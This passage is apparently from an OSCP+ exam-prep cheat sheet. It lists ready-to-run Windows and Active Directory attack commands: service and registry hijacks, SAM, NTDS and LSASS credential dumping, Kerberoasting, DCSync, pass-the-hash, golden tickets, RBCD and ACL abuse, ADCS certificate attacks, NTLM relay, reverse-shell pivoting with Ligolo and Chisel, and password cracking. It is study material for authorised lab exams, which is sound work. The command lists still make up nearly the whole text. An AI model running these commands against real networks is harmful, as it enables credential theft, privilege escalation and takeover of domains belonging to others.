Pick **one** Potato you tested. GodPotato/PrintSpoofer cover most Server 2019/2022 boxes. [CentralizedPotatoes](https://github.com/AtvikSecurity/CentralizedPotatoes) · [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato).

### Services

```cmd
icacls "C:\path\to\folder"
sc qc <service>
sc config <service> binPath= "C:\Windows\Tasks\shell.exe"
sc start <service>

wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
reg add HKLM\SYSTEM\CurrentControlSet\Services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Tasks\shell.exe /f
net start <service>
```

Unquoted path, Everyone FullControl on the binary, or weak service registry → replace / restart. DLL hijack: Procmon missing DLL + write in the search path → msfvenom `-f dll` → restart service.

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i reverse.msi
schtasks /query /fo LIST /v
```

Both AlwaysInstallElevated keys `0x1` required.

### Sensitive files / registry

```text
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
C:\Windows.old
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

```cmd
findstr /si password *.txt *.xml *.ini *.config
dir /s /b unattend.xml sysprep.xml web.config *.kdbx
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
cmdkey /list
runas /savecred /user:<ADMIN> C:\Windows\Tasks\shell.exe
```

### Backup Operators

```cmd
mkdir C:\Windows\Tasks
reg save HKLM\SAM C:\Windows\Tasks\SAM
reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

NTDS via diskshadow (`unix2dos` the script on Kali first):

```
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

```cmd
diskshadow /s ntds.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

[SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) · [Backup Operator](https://www.bordergate.co.uk/backup-operator-privilege-escalation/).

LSASS without Mimikatz (then parse on Kali):

```cmd
reg save HKLM\SECURITY C:\Windows\Tasks\SECURITY
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Tasks\lsass.dmp full
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
pypykatz lsa minidump lsass.dmp
```

After SYSTEM: Mimikatz `privilege::debug` + `sekurlsa::logonpasswords` / `lsadump::sam` / `lsadump::secrets`, then PTH/spray. `nxc smb <RHOST> -u <ADMIN> -H '<NTHASH>' --sam --lsa` from Kali if 445 is open.

---

## Active Directory

Assumed breach: the panel gives a low-priv domain user. Points: MS01 10, MS02 10, DC 20. After every new identity, re-collect BloodHound.

```bash
nxc smb <DC> -u '<USER>' -p '<PASS>' --shares --users --groups --pass-pol
nxc ldap <DC> -u '<USER>' -p '<PASS>'
nxc ldap <DC> -u '<USER>' -p '<PASS>' --asreproast asrep.txt
nxc ldap <DC> -u '<USER>' -p '<PASS>' --kerberoasting roast.txt
nxc winrm <MS01> -u '<USER>' -p '<PASS>'
nxc smb <NET>/24 -u '<USER>' -p '<PASS>' --continue-on-success   # Pwn3d! = local admin
kerbrute userenum --dc <DC> -d <DOMAIN> users.txt
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<DC> -o ldap_out
```

Read lockout **before** spraying.

### BloodHound / SharpHound

```bash
bloodhound-python -u '<USER>' -p '<PASS>' -d '<DOMAIN>' -dc '<DC>' -ns '<DC>' -c all --zip
bloodhound-python -u '<USER>' -p '<PASS>' -d '<DOMAIN>' -dc '<DC>' -ns '<DC>' --dns-tcp -no-pass -c all --zip
rusthound-ce -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --zip -c All
bloodhound-ce-python -c all -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --zip -ns <DC>
```

```cmd
SharpHound.exe -c All
```

If collectors disagree, import both — duplicates are ignored. Queries: shortest path to DA, Kerberoastable, AS-REP, unconstrained/constrained/RBCD, DCSync, outbound control from **your** user.

### Users, groups, descriptions, GPP

```bash
enum4linux -a <DC>
nxc smb <DC> -u guest -p '' --rid-brute
impacket-lookupsid '<DOMAIN>/guest'@<DC> -no-pass | grep 'SidTypeUser'
impacket-GetADUsers -all '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC>
ldapsearch -x -H ldap://<DC> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description info comment
nxc smb <DC> -u '<USER>' -p '<PASS>' -M gpp_password
nxc smb <DC> -u '<USER>' -p '<PASS>' -M gpp_autologin
gpp-decrypt '<cpassword>'
```

```cmd
net user /domain
net group /domain
net localgroup administrators
```

```bash
nxc smb <DC> -u users.txt -p '<PASS>' --continue-on-success
nxc smb <NET>/24 -u '<USER>' -p '<PASS>' --continue-on-success
nxc winrm <NET>/24 -u '<USER>' -H '<NTHASH>' --continue-on-success
```

### Kerberoast / AS-REP / DCSync / PTH

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC> -request
impacket-GetNPUsers '<DOMAIN>/' -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-getTGT '<DOMAIN>/<USER>' -hashes :<NTHASH> -dc-ip <DC>
export KRB5CCNAME=<USER>.ccache
impacket-secretsdump '<DOMAIN>/<ADMIN>:<PASS>'@<DC>
impacket-secretsdump '<DOMAIN>/<ADMIN>@<DC>' -hashes :<NTHASH>

impacket-wmiexec '<DOMAIN>/<USER>@<RHOST>' -hashes :<NTHASH>
impacket-dcomexec '<DOMAIN>/<USER>@<RHOST>' -hashes :<NTHASH>
evil-winrm -i <RHOST> -u <USER> -H <NTHASH>
nxc smb <RHOST> -u <USER> -H <NTHASH>
nxc smb <RHOST> -u <USER> -H '<NTHASH>' --sam --lsa
export KRB5CCNAME=Administrator.ccache
impacket-psexec '<DOMAIN>/administrator@<DC>' -k -no-pass
```

Hashcat `-m 13100` (TGS) / `-m 18200` (AS-REP). Prefer wmiexec / evil-winrm over psexec.

Constrained delegation:

```bash
impacket-getST -dc-ip <DC> -spn '<SPN>' -hashes :<NTHASH> -impersonate Administrator '<DOMAIN>/<SERVICE>'
```

Golden ticket (usually after DCSync — `krbtgt` hash):

```bash
impacket-ticketer -nthash <KRBTGT_NT> -domain <DOMAIN> -domain-sid <SID> Administrator
```

```text
kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_NT> /id:500 /ptt
```

Do not use LLMNR poison for unconstrained coercion on the exam.

### RBCD / targeted Kerberoast / MAQ

GenericWrite or GenericAll on a **computer**, or `ms-DS-MachineAccountQuota` > 0:

```bash
impacket-addcomputer '<DOMAIN>/<USER>:<PASS>' -computer-name 'FAKE$' -computer-pass 'Passw0rd!' -dc-host <DC>
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip <DC> -action write '<DOMAIN>/<USER>:<PASS>'
impacket-getST -spn 'cifs/TARGET.<DOMAIN>' -impersonate Administrator -dc-ip <DC> '<DOMAIN>/FAKE$:Passw0rd!'
export KRB5CCNAME=Administrator.ccache
```

WriteSPN on a user (targeted Kerberoast):

```bash
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' set object '<TARGET>' servicePrincipalName -v 'http/fake'
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC> -request-user '<TARGET>'
```

### bloodyAD / ACL

Usual edges: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember.

```bash
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get children 'DC=corp,DC=local' --type user
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get children 'DC=corp,DC=local' --type computer
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get object '<GROUP>' --attr member
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get object '<MACHINE>$' --attr ms-Mcs-AdmPwd
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get object '<GMSA>$' --attr msDS-ManagedPassword
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get object 'DC=corp,DC=local' --attr ms-DS-MachineAccountQuota
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' get object 'DC=corp,DC=local' --attr minPwdLength

bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' add groupMember '<GROUP>' '<USER>'
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' set password '<TARGET>' '<NewPass>'
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' set owner '<OBJECT>' '<USER>'
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' add genericAll '<OBJECT>' '<USER>'
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' add uac '<USER>' DONT_REQ_PREAUTH
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' add computer '<NAME>' '<PASS>'
bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' add dnsRecord <NAME> <LHOST>
```

Kerberos: `--dc-ip <DC> -k`. Hash: `-p ':nthash'`.

```bash
net rpc password '<TARGET>' '<NewPass>' -U '<DOMAIN>/<USER>%<PASS>' -S '<DC>'
pth-net rpc password '<TARGET>' '<NewPass>' -U '<DOMAIN>/<USER>%<LM>:<NT>' -S '<DC>'
python3 gMSADumper.py -u '<USER>' -p '<PASS>' -d '<DOMAIN>'
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' <DC> -a add -r <NAME> -d <LHOST> -t A
```

NTLM relay: spoofing banned. Only with an allowed in-scope trigger (e.g. a file on a writable share). [ntlm_theft](https://github.com/Greenwolf/ntlm_theft).

```bash
impacket-ntlmrelayx -t <TARGET> -smb2support
```

A domain user on MS01 is **not** DA. Run Windows privesc, dump LSASS/SAM, then move. Linux domain-joined: keytabs, `krb5cc_*`, SSSD configs.

---

## Certificate abuse (ADCS)

[Certipy](https://github.com/ly4k/Certipy) · [Certify](https://github.com/GhostPack/Certify)

```bash
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC> -vulnerable -stdout
certipy-ad find -u '<USER>@<DOMAIN>' -hashes :<NTHASH> -dc-ip <DC> -vulnerable -stdout
```

```cmd
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

| ESC | Meaning |
| --- | --- |
| ESC1 | Enrollee supplies SAN + client auth + you can enroll |
| ESC2/3 | Overly broad EKU / enrollment agent |
| ESC4 | Write the template → make it ESC1, request, **revert** |
| ESC6 | CA allows SAN in attributes |
| ESC7 | ManageCA / ManageCertificates |
| ESC8 | HTTP enrollment → NTLM relay (no poison) |
| ESC9/10 | Weak mapping + UPN trick |

```bash
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA>' \
  -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dc-ip <DC>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC> -domain '<DOMAIN>'
certipy-ad auth -pfx administrator.pfx -dc-ip <DC> -domain '<DOMAIN>' -ldap-shell

certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASS>' \
  -account '<TARGET>' -target '<DOMAIN>' -dc-ip <DC>

certipy-ad account update -u '<USER>' -hashes :<HASH> -user '<TARGET>' -upn 'Administrator' -dc-ip <DC>
certipy-ad template -username '<USER>@<DOMAIN>' -password '<PASS>' -dc-ip <DC> -template '<TEMPLATE>' -save-old
```

If Certipy wants the request twice, restore the original UPN first. Revert templates with the saved JSON.

ESC8 (HTTP enrollment, **no** LLMNR poison): only if you already have an in-scope coerce (e.g. `xp_dirtree`, a file on a share the victim will open):

```bash
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Then `certipy auth -pfx ...`.

---

## Tunneling & pivoting

Metasploit cannot be the pivot (second target). Prefer Ligolo-ng.

### Ligolo-ng

```bash
sudo ip tuntap add user "$(whoami)" mode tun ligolo
sudo ip link set ligolo up
./proxy -laddr 0.0.0.0:9001 -selfcert
```

```text
agent.exe -connect <LHOST>:9001 -ignore-cert
```

Proxy console: `session` → `ifconfig` → on Kali `sudo ip route add <INTERNAL>/24 dev ligolo` → `start`. Newer builds: `interface_create` / `tunnel_start --tun ligolo` / `autoroute`. Check `./proxy -h`.

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

Kali: `nc -lvnp 4444`. Internal victim connects to **the agent host:1234**. Same pattern for HTTP (`--to 127.0.0.1:8001`).

[Ligolo docs](https://docs.ligolo.ng/Quickstart/) · [arth0s](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5) · [ph03n1x](https://ph03n1x.net/ligolo-cheatsheet/).

### Chisel / Proxychains / SSH

```bash
chisel server -p 9001 --reverse
# victim socks: chisel.exe client <LHOST>:9001 R:socks
# one port:     chisel.exe client <LHOST>:9001 R:3389:127.0.0.1:3389
```

`/etc/proxychains4.conf`: `socks5 127.0.0.1 1080` (confirm the port). Quiet mode on once it works.

```bash
socat TCP-LISTEN:8080,fork TCP:<INTERNAL>:80
proxychains nxc smb hosts.txt -u '<USER>' -p '<PASS>' --continue-on-success
proxychains evil-winrm -i <INTERNAL> -u '<USER>' -p '<PASS>'
proxychains nmap -sT -Pn -n -p 445,3389,5985 <INTERNAL>
```

```bash
ssh -i id_rsa -D 9050 <USER>@<RHOST>
ssh -i id_rsa -L 1433:<INTERNAL>:1433 <USER>@<RHOST>
ssh -i id_rsa -R 9090:127.0.0.1:9001 <USER>@<RHOST>
ssh -J <USER>@<PIVOT> <USER>@<INTERNAL>
```

If the next AD box looks dead: second NIC on the foothold? Ligolo `start` **and** route? `-sT -Pn` through socks? Firewall only allows SMB from MS01?

---

## Credentials & cracking

1. Valid username first (SMTP, SNMP, RID, BloodHound, web).
2. `user:user`, `admin:admin`, service defaults, hostname-based passwords.
3. Reuse every secret on every in-scope service.
4. Crack offline when you can.
5. Honour `--pass-pol` / lockout.

```text
password  password1  Password1  Password@123  admin  administrator  admin@123  Welcome1
```

[Hash analyzer](https://www.tunnelsup.com/hash-analyzer/) · `hashid` · Name-That-Hash.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
ssh2john id_rsa > ssh.hash
zip2john file.zip > zip.hash
keepass2john Database.kdbx > keepass.hash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <MODE> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
cewl http://<RHOST>/ -w cewl.txt
# then hydra/nxc with cewl.txt + company name mangling
```

| `-m` | Type |
| --- | --- |
| 0 | MD5 |
| 500 | md5crypt `$1$` |
| 1800 | sha512crypt `$6$` |
| 1000 | NTLM (PTH yes) |
| 5600 | NetNTLMv2 (PTH **no**) |
| 2100 | DCC2 / mscache |
| 13100 | Kerberoast TGS |
| 18200 | AS-REP |
| 13400 | KeePass (confirm with `--example-hashes`) |

Open KeePass with KeePassXC; check for a keyfile next to the `.kdbx`.

```bash
dir /s /b *.kdbx
```

---

## Post-exploitation

```bash
id; hostname; ip a; ip route; ss -tlnp; ps aux
cat ~/.bash_history /etc/hosts /etc/resolv.conf
find / -name 'krb5cc_*' -o -name '*.ccache' -o -name '*.keytab' 2>/dev/null
```

```cmd
whoami /all
ipconfig /all
route print
arp -a
netstat -ano
quser
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Second NICs and `0.0.0.0` listeners are how you find MS02. Also: `web.config`, `.env`, `wp-config.php`, `unattend.xml`. Exam does not grade persistence — keep a documented foothold you can replay after a revert.

```text
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
privilege::debug
token::elevate
lsadump::dcsync /user:krbtgt
lsadump::sam
lsadump::secrets
```

```bash
cmd.exe /c "shutdown /r /t 0"
source venv/bin/activate
```

---

## Reporting

Write as you hack. Official templates: [PEN-200 Reporting Requirements](https://help.offsec.com/hc/en-us/articles/360046787731-PEN-200-Reporting-Requirements).

Per machine: one-paragraph path, commands that changed state, exploit URL (or modified code + why), interactive screenshot with IP + `cat`/`type` of the original flag path, control-panel submit during the 23h45m.

Per-host live notes:

```
Host / IP / points
Open ports
Foothold (weakness, steps, local.txt)
Privesc (vector, steps, proof.txt)
Loot table (secret / where / reused on)
Pivot notes
```

AI is banned in the report window too.

---

## Useful links

- [OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [OSCP+ Exam FAQ](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ)
- [Exam format changes](https://help.offsec.com/hc/en-us/articles/29865898402836-OSCP-Exam-Changes)
- [GTFOBins](https://gtfobins.github.io/) · [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks](https://book.hacktricks.xyz/) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) · [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/)
- [NetExec](https://github.com/Pennyw0rth/NetExec) · [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) · [Certipy](https://github.com/ly4k/Certipy)
- [saisathvik1/OSCP-Cheatsheet](https://github.com/saisathvik1/OSCP-Cheatsheet)
